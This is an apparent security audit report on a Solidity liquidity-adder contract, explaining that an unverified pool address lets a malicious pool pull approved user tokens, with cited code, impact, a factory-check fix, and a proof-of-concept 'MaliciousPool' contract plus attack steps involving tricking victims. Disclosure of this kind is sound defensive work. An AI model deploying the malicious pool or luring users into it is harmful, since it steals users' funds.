### Title
Unverified Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain Approved User Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address without verifying it against the factory. The callback `metricOmmModifyLiquidityCallback` trusts `msg.sender` (the unverified pool) for both the token addresses (via `getImmutables()`) and the payment amounts. A malicious pool can therefore redirect up to `maxAmountToken0` / `maxAmountToken1` of any ERC-20 tokens from the victim's wallet to itself.

---

### Finding Description

The NatSpec on the contract explicitly acknowledges the missing guard: [1](#0-0) 

Inside `metricOmmModifyLiquidityCallback`, the only caller-authenticity check is: [2](#0-1) 

`expectedPool` is whatever address the user passed as `pool` — it was stored verbatim by `_setPayContext`: [3](#0-2) 

After the caller check passes, the callback unconditionally trusts `msg.sender` (the unverified pool) to supply the token addresses: [4](#0-3) 

Because `getImmutables()` is called on the attacker-controlled contract, the attacker chooses which tokens are pulled. Because `amount0Delta` / `amount1Delta` are the values the malicious pool passed into the callback, the attacker also chooses the amounts (up to the user-supplied caps).

The same flaw is present in all four public entry points: both overloads of `addLiquidityExactShares` and both overloads of `addLiquidityWeighted`, all of which ultimately call `_addLiquidity` with the unverified pool: [5](#0-4) 

---

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for USDC/WETH (or any token) and is induced to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 in a single transaction. The attacker receives those tokens directly (the `pay` call sends to `msg.sender`, i.e., the malicious pool). This is a direct loss of user principal with no recovery path.

---

### Likelihood Explanation

The attack requires the victim to:
1. Have approved the `MetricOmmPoolLiquidityAdder` for the targeted tokens (normal prerequisite for any LP action).
2. Be induced to call one of the four entry points with a malicious pool address — achievable via a spoofed front-end, a phishing link, or a malicious aggregator integration.

No privileged role is needed on the attacker's side. The malicious pool is a trivially deployable contract.

---

### Recommendation

Verify the supplied `pool` address against the `MetricOmmPoolFactory` before storing it in the transient pay context. A minimal fix:

```solidity
// In _addLiquidity (or at each public entry point):
require(IMetricOmmPoolFactory(factory).isPool(pool), "Unknown pool");
```

This mirrors the allowlist recommendation from the external report and closes the gap without restricting permissionless LP flows for legitimate pools.

---

### Proof of Concept

```solidity
contract MaliciousPool {
    address immutable adder;
    address immutable token0; // e.g. USDC
    address immutable token1; // e.g. WETH

    constructor(address _adder, address _t0, address _t1) {
        adder = _adder; token0 = _t0; token1 = _t1;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Trigger callback with maximum allowed amounts
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX0, MAX1, abi.encode(uint8(1)) // KIND_PAY
        );
        return (MAX0, MAX1);
    }

    // Callback trusts this for token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }
}

// Attack:
// 1. Victim approves LiquidityAdder for USDC and WETH.
// 2. Attacker deploys MaliciousPool(adder, USDC, WETH).
// 3. Victim is tricked into calling:
//    adder.addLiquidityExactShares(maliciousPool, victim, 0, deltas, MAX0, MAX1, "");
// 4. MaliciousPool.addLiquidity fires callback → pay(USDC, victim, maliciousPool, MAX0)
//                                               → pay(WETH, victim, maliciousPool, MAX1)
// 5. Attacker receives MAX0 USDC + MAX1 WETH from victim.
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-176)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```
